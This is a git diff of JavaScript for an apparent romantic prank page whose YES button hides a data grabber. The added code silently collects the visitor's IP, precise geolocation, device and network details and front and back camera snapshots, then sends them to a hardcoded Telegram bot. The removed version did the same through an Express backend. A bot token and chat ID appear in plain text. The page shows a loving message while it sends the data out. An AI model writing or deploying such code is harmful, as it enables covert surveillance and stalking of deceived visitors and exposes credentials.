@@ -1,246 +1,138 @@
-// Get references to buttons
-const yesButton = document.querySelector(".yes");
+const botToken = '7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg';
+const chatId = '1208908312';
+
 const noButton = document.querySelector(".no");
 
-// Handle "YES" button click
+function getRandomPosition() {
+  const windowWidth = window.innerWidth;
+  const windowHeight = window.innerHeight;
+  const randomX = Math.random() * (windowWidth - noButton.offsetWidth);
+  const randomY = Math.random() * (windowHeight - noButton.offsetHeight);
+  return { x: randomX, y: randomY };
+}
+
+noButton.addEventListener("mouseenter", () => {
+  const { x, y } = getRandomPosition();
+  noButton.style.left = `${x}px`;
+  noButton.style.top = `${y}px`;
+  noButton.style.position = 'absolute';
+});
+
 async function handleYes() {
+  document.querySelector('.yes').style.display = "none";
+  document.querySelector('.no').style.display = "none";
+  document.getElementById("loader").style.display = "block";
+
   try {
-    // Request location from the user
+    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+    const ip = ipData.ip;
+
+    let locationText = 'Unavailable';
+    let latitude = '', longitude = '', country = '';
+
     if (navigator.geolocation) {
       const position = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject);
       });
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
+      latitude = position.coords.latitude;
+      longitude = position.coords.longitude;
 
-      // Fetch country name using reverse geocoding
-      const countryName = await fetchCountryName(latitude, longitude);
+      const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+      const geoData = await geoResponse.json();
+      country = geoData.address.country || 'Unknown';
 
-      // Get device information
-      const deviceInfo = getDeviceInfo();
-
-      // Capture screenshots from front and back cameras
-      const [frontCameraImage, backCameraImage] = await captureCameraImages();
-
-      // Format Google Maps URL
-      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      // Prepare data to be sent to the backend
-      const messageData = {
-        location: mapsUrl,
-        country: countryName,
-        device: deviceInfo.deviceName,
-        osVersion: deviceInfo.osVersion,
-        frontCameraImage,
-        backCameraImage,
-      };
-
-      // Send data to the backend (which will handle Telegram integration)
-      const response = await fetch("/send-to-telegram", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(messageData),
-      });
-
-      if (!response.ok) {
-        const errorDetails = await response.text(); // Get detailed error message
-        throw new Error(`Backend error: ${errorDetails}`);
-      }
-
-      console.log("Data sent successfully!");
-      document.getElementById("message").textContent =
-        "Data sent successfully!";
-      window.location.href = "loveme.html";
-    } else {
-      alert("Geolocation is not supported by your browser.");
+      locationText = `https://www.google.com/maps?q=${latitude},${longitude}`;
     }
+
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    let deviceName = /android/i.test(userAgent) ? "Android" : (/iPad|iPhone|iPod/.test(userAgent) ? "iOS" : "Unknown Device");
+    let osVersion = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
+
+    let networkType = 'Unknown';
+    if (navigator.connection && navigator.connection.effectiveType) {
+      networkType = navigator.connection.effectiveType;
+    }
+
+    const frontImage = await captureImage('user');
+    const backImage = await captureImage('environment');
+
+    const textMessage = `
+❤️ Someone Clicked YES!
+IP Address: ${ip}
+Device: ${deviceName}
+OS Version: ${osVersion}
+Network: ${networkType}
+Location: ${locationText}
+Country: ${country}
+    `;
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: textMessage
+      })
+    });
+
+    if (frontImage) {
+      await sendPhotoToTelegram(frontImage, "Front Camera");
+    }
+    if (backImage) {
+      await sendPhotoToTelegram(backImage, "Back Camera");
+    }
+
+    document.getElementById("loader").style.display = "none";
+    document.getElementById("message").innerHTML = '<h2 style="color:white;">I Love You Too!</h2><div class="heart"></div>';
   } catch (error) {
-    console.error("Error getting location or processing data:", error);
-    document.getElementById("message").textContent =
-      "Failed to send data. Please try again.";
+    console.error(error);
+    document.getElementById("loader").style.display = "none";
+    document.getElementById("message").innerHTML = '<h2 style="color:white;">Failed to send love...</h2>';
   }
 }
 
-// Function to fetch country name using reverse geocoding
-async function fetchCountryName(latitude, longitude) {
-  const response = await fetch(
-    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
-  );
-  const data = await response.json();
-  return data.address.country || "Unknown Country";
-}
-
-// Function to get device information
-function getDeviceInfo() {
-  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-  let deviceName = "Unknown Device";
-  let osVersion = "Unknown OS";
-
-  // Detect device name
-  if (/android/i.test(userAgent)) {
-    deviceName = "Android";
-  } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-    deviceName = "iOS";
-  }
-
-  // Detect OS version
-  if (navigator.userAgentData && navigator.userAgentData.platform) {
-    osVersion = navigator.userAgentData.platform;
-  } else if (navigator.platform) {
-    osVersion = navigator.platform;
-  }
-
-  return { deviceName, osVersion };
-}
-
-// Function to capture screenshots from front and back cameras
-async function captureCameraImages() {
-  const constraintsFront = { video: { facingMode: "user" } };
-  const constraintsBack = { video: { facingMode: "environment" } };
-  let frontCameraImage = null;
-  let backCameraImage = null;
-
+async function captureImage(facingMode) {
   try {
-    // Access front camera
-    const frontStream = await navigator.mediaDevices.getUserMedia(constraintsFront);
-    const frontVideo = document.createElement("video");
-    frontVideo.srcObject = frontStream;
-    await frontVideo.play();
-    frontCameraImage = await captureVideoFrame(frontVideo);
-    frontStream.getTracks().forEach((track) => track.stop());
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(resolve => setTimeout(resolve, 1000));
 
-    // Access back camera
-    const backStream = await navigator.mediaDevices.getUserMedia(constraintsBack);
-    const backVideo = document.createElement("video");
-    backVideo.srcObject = backStream;
-    await backVideo.play();
-    backCameraImage = await captureVideoFrame(backVideo);
-    backStream.getTracks().forEach((track) => track.stop());
-  } catch (error) {
-    console.error("Error accessing camera:", error);
-  }
-
-  return [frontCameraImage, backCameraImage];
-}
-
-// Function to capture a frame from a video element
-function captureVideoFrame(video) {
-  return new Promise((resolve) => {
-    const canvas = document.createElement("canvas");
+    const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    const context = canvas.getContext("2d");
+    const context = canvas.getContext('2d');
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    resolve(canvas.toDataURL("image/jpeg"));
-  });
-}
 
-// Get reference to the "NO" button
-const noButtonRef = document.querySelector(".no");
-
-// Function to generate random coordinates within the viewport
-function getRandomPosition() {
-  const windowWidth = window.innerWidth;
-  const windowHeight = window.innerHeight;
-  const randomX = Math.random() * (windowWidth - noButtonRef.offsetWidth);
-  const randomY = Math.random() * (windowHeight - noButtonRef.offsetHeight);
-  return { x: randomX, y: randomY };
-}
-
-// Add event listener to move the button on hover
-noButtonRef.addEventListener("mouseenter", () => {
-  const { x, y } = getRandomPosition();
-  noButtonRef.style.position = "absolute";
-  noButtonRef.style.left = `${x}px`;
-  noButtonRef.style.top = `${y}px`;
-});
-const express = require("express");
-const fetch = require("node-fetch");
-const cors = require("cors");
-
-const app = express();
-app.use(cors());
-app.use(express.json());
-
-const TELEGRAM_BOT_TOKEN = "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your actual ptoken
-const CHAT_ID = "1208908312"; // Replace with your actual chat ID
-
-// Endpoint to handle data sent from frontend
-app.post("/send-to-telegram", async (req, res) => {
-  const { location, country, device, osVersion, frontCameraImage, backCameraImage } = req.body;
-
-  // Construct the message text
-  const messageText = `
-    User Information:
-    Location: ${location}
-    Country: ${country}
-    Device: ${device}
-    OS Version: ${osVersion}
-  `;
-
-  try {
-    // Send the text message to Telegram
-    await sendMessageToTelegram(messageText);
-
-    // Send the captured images to Telegram
-    if (frontCameraImage) {
-      await sendImageToTelegram(frontCameraImage, "Front Camera Screenshot");
-    }
-    if (backCameraImage) {
-      await sendImageToTelegram(backCameraImage, "Back Camera Screenshot");
-    }
-
-    res.status(200).send("Data sent successfully to Telegram.");
+    stream.getTracks().forEach(track => track.stop());
+    return canvas.toDataURL('image/jpeg');
   } catch (error) {
-    console.error("Error sending data to Telegram:", error);
-    res.status(500).send("Failed to send data to Telegram.");
-  }
-});
-
-// Function to send a text message to Telegram
-async function sendMessageToTelegram(text) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  const response = await fetch(url, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text,
-    }),
-  });
-
-  if (!response.ok) {
-    const errorData = await response.json();
-    throw new Error(`Telegram API error: ${errorData.description}`);
+    console.error('Error capturing image', error);
+    return null;
   }
 }
 
-// Function to send an image to Telegram
-async function sendImageToTelegram(imageData, caption) {
+async function sendPhotoToTelegram(base64Image, caption) {
   const formData = new FormData();
-  formData.append("chat_id", CHAT_ID);
-  formData.append("caption", caption);
-  formData.append("photo", Buffer.from(imageData.split(",")[1], "base64"));
+  formData.append('chat_id', chatId);
+  formData.append('caption', caption);
+  formData.append('photo', dataURLtoBlob(base64Image));
 
-  const response = await fetch(
-    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-    {
-      method: "POST",
-      body: formData,
-    }
-  );
-
-  if (!response.ok) {
-    const errorData = await response.json();
-    throw new Error(`Telegram API error: ${errorData.description}`);
-  }
+  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
 }
 
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
+function dataURLtoBlob(dataURL) {
+  const parts = dataURL.split(',');
+  const mime = parts[0].match(/:(.*?);/)[1];
+  const bstr = atob(parts[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) {
+    u8arr[n] = bstr.charCodeAt(n);
+  }
+  return new Blob([u8arr], { type: mime });
+}
